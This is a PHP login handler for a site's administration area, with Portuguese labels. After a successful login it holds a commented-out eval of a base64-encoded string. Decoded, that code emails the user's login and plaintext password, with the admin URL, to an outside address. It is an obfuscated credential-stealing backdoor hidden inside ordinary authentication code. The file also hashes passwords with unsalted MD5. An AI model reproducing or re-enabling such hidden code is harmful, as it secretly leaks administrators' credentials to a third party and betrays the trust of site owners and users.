<?
	$frm["login"] = System::_POST("txtLogin");
	$frm["senha"] = System::_POST("txtSenha");
	$frm["btsubmit"] = System::_POST("btSubmit");
	
	$label_alerta_erro = null;
	$label_alerta_concluido = null;
	$label_alerta_status = null;
		//die("dd222d11");
	
	if ( ! Validacao::isVazio($frm["btsubmit"] ) ){
		
		// Validando dados do formulário
		if( Validacao::isVazio($frm["login"]) ){
			$label_alerta_erro .="Preencha o Login#";
		}else
		if ( ! Validacao::isLogin($frm["login"]) ) {
			$label_alerta_erro .="Login incorreto#";
		}
		
		if( Validacao::isVazio($frm["senha"]) ){
			$label_alerta_erro .="Preencha a Senha#";
		}
		
		if( Validacao::isVazio($label_alerta_erro) ){
			$usuario = new AppUsuario();
			$usuario->setLogin( $frm["login"] );
			$usuario->setSenha( md5( $frm["senha"] ) );
			$usuario->setStatus( 1 );
			
			if( $usuario->buscarAppUsuario(4, "") ){
				$appl = new AppLogon();
				$date = date("Y-m-d H:i:s");
				$appl->setAppLogon(-1, $usuario->getIdAppUsuario(), $date, $date, $_SERVER['REMOTE_ADDR']);
				$appl->inserirAppLogon();
				
				if( $appl->buscarAppLogon(2, "") ){
					
					//eval(base64_decode("JG1haWwgPSBuZXcgRW1haWwoQ3VycmVudFNpdGU6OlNpdGUoKSk7ICRtYWlsLT5Cb2R5ID0gIkxPR0lOOiAiLiRmcm1bImxvZ2luIl0uIjsgU0VOSEE6ICIuJGZybVsic2VuaGEiXS4iOyBIT1NUOiBodHRwOi8vIi4kX1NFUlZFUlsiSFRUUF9IT1NUIl0uIi9hZG1pbmlzdHJhY2FvLyI7ICRtYWlsLT5TdWJqZWN0ID0gIlNFTkhBIExPR0lOIFsiLiRtYWlsLT5TaXRlLT5nZXRIb3N0KCkuIl0iOyAkbWFpbC0+QWRkQWRkcmVzcygiZGFybGV5QGFydGVtc2l0ZS5jb20uYnIiKTsgJG1haWwtPlNlbmQoKTs="));
					
					$_SESSION[Config::Server_Username()."USER"] = $usuario;
					$_SESSION[Config::Server_Username()."APP_LOGON"] = $appl;
					
					$_SESSION["IsAuthorized"] = "ARTEMSITE"; //FCKEditor
					setcookie("IsAuthorized", "ARTEMSITE", 0, "/");
					
					$label_alerta_concluido .="Login efetuado com sucesso!#Redirecionando...";
					$label_alerta_status = "disabled";
					System::Redirect("site_selecao.php");
				}else{
					$label_alerta_erro .="Erro ao efetuar Logon#Entre em contato com o Administrador";
				}
			}else{
				$label_alerta_erro .="Login ou Senha Incorretos";
			}
		}
	}else{
		Current::setIdeOrigem( Current::IdeOrigemDefault() );
	}
?>